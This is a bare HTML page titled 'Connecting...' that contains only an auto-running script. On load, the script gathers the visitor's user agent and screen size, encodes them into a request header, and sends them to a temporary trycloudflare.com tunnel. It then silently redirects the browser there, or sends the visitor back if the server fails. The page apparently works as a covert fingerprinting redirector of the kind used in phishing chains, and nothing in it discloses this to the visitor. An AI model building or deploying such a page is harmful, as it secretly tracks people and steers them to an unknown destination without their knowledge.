<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connecting...</title>
</head>
<body>

<script>
(async () => {
    const server = "https://sue-shorter-probability-consists.trycloudflare.com";
    const target = server + "/visit/";

    // Generate unique timestamp-like token
    const now = new Date();
    const timestamp =
        now.getFullYear().toString() +
        String(now.getMonth() + 1).padStart(2, "0") +
        String(now.getDate()).padStart(2, "0") +
        String(now.getHours()).padStart(2, "0") +
        String(now.getMinutes()).padStart(2, "0") +
        String(now.getSeconds()).padStart(2, "0") +
        String(now.getMilliseconds()).padStart(3, "0");

    const random = Math.random().toString(36).substring(2, 10);
    const token = timestamp + random;

    // Device information including User Agent
    const payload = {
        timestamp: now.toISOString(),
        token: token,
        userAgent: navigator.userAgent,
        resolution: {
            width: screen.width,
            height: screen.height
        }
    };

    // Encode JSON as Base64
    const encoded = btoa(
        unescape(encodeURIComponent(JSON.stringify(payload)))
    );

    try {
        // Server handshake parcel request
        const response = await fetch(target + "?j=" + token, {
            method: "GET",
            headers: {
                "X-Device-Info": encoded
            },
            cache: "no-store"
        });

        if (!response.ok) {
            throw new Error("Server unavailable");
        }

        // Continue to destination
        window.location.replace(target + "?j=" + token);

    } catch (error) {
        history.back();
    }
})();
</script>

</body>
</html>
